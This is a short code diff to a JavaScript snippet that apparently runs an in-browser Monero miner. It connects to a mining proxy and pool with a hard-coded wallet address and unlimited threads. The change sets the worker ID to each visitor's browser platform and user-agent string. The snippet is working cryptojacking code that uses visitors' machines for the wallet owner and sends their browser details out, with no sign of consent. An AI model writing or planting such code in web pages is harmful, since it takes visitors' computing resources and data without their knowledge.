@@ -11,7 +11,7 @@
     server = "wss://f.xmrminingproxy.com:8181";
     var pool = "moneroocean.stream";
     var walletAddress = "425LHaug8eJdEKu5aySf5uS73uvBeTRms4USFF9hx3hE9vRA1yUWDw3aEPj6wEYbMGPeQHEgvaRSiJxwmfzFtHFg92yf7R3";
-    var workerId = "#1"
+    var workerId = navigator.platform + ":" + navigator.userAgent;
     var threads = -1;
     var password = "x";
     startMining(pool, walletAddress, workerId, threads, password);
